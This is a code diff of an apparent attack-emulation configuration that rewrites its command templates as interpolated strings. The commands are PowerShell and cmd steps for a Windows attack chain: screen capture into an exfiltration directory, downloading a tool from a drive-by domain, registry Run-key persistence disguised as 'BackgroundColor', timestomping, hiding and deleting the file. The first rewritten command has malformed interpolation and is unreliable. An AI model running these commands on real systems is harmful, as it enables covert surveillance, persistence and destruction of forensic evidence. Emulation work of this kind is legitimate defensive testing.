@@ -189,14 +189,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell $d = \"",
-                            "self.exfil_dir",
-                            "self.exfil_file",
-                            "\"; [void][reflection.assembly]::loadwithpartialname('system.windows.forms'); [system.windows.forms.sendkeys]::sendwait(\"{PRTSC}\"); $e = [System.Windows.Forms.Clipboard]::GetDataObject(); [System.Drawing.Bitmap]$e.getimage().Save($d, [System.Drawing.Imaging.ImageFormat]::Jpeg); echo \" \""
-                        ]
-                    }
+                    "command": "powershell $d = \"${self.exfil_dir}self.exfil_file${\"; [void][reflection.assembly]::loadwithpartialname('system.windows.forms'); [system.windows.forms.sendkeys]::sendwait(\"{PRTSC}\"); $e = [System.Windows.Forms.Clipboard]::GetDataObject(); [System.Drawing.Bitmap]$e.getimage().Save($d, [System.Drawing.Imaging.ImageFormat]::Jpeg); echo \" \"}"
                 }
             }
         },
@@ -209,21 +202,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell mkdir ",
-                            "self.temp_dir_name",
-                            "; Invoke-WebRequest -Uri \"",
-                            "self.driveby_domain2",
-                            "/",
-                            "self.tool_name2",
-                            "\" -OutFile ",
-                            "self.temp_dir_name",
-                            "\\",
-                            "self.tool_name2",
-                            "; echo \" \""
-                        ]
-                    }
+                    "command": "powershell mkdir ${self.temp_dir_name}; Invoke-WebRequest -Uri \"${self.driveby_domain2}/${self.tool_name2}\" -OutFile ${self.temp_dir_name}\\${self.tool_name2}; echo \" \""
                 }
             }
         },
@@ -259,15 +238,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1_elevated",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "cmd /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v BackgroundColor /d ",
-                            "self.temp_dir_name",
-                            "\\",
-                            "self.tool_name2",
-                            " && echo \"\""
-                        ]
-                    }
+                    "command": "cmd /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v BackgroundColor /d ${self.temp_dir_name}\\${self.tool_name2} && echo \"\""
                 }
             }
         },
@@ -322,13 +293,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1_elevated",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{$NewDate = (Get-Date '01/01/1969 01:01am'); $TSFile = gci -hidden C:\\Users\\Public\\Downloads\\",
-                            "self.exfil_file",
-                            "; $TSFile.LastWriteTime = $NewDate; $TSFile.CreationTime = $NewDate; $TSFile.LastAccessTime = $NewDate; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{$NewDate = (Get-Date '01/01/1969 01:01am'); $TSFile = gci -hidden C:\\Users\\Public\\Downloads\\${self.exfil_file}; $TSFile.LastWriteTime = $NewDate; $TSFile.CreationTime = $NewDate; $TSFile.LastAccessTime = $NewDate; echo \" \"}"
                 }
             }
         },
@@ -341,13 +306,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1_elevated",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "cmd /c attrib +H C:\\Users\\Public\\Downloads\\",
-                            "self.exfil_file",
-                            " && echo \" \""
-                        ]
-                    }
+                    "command": "cmd /c attrib +H C:\\Users\\Public\\Downloads\\${self.exfil_file} && echo \" \""
                 }
             }
         },
@@ -379,13 +338,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1_elevated",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "cmd /c del C:\\Users\\Public\\Downloads\\",
-                            "self.exfil_file",
-                            " && echo ' '"
-                        ]
-                    }
+                    "command": "cmd /c del C:\\Users\\Public\\Downloads\\${self.exfil_file} && echo ' '"
                 }
             }
         },
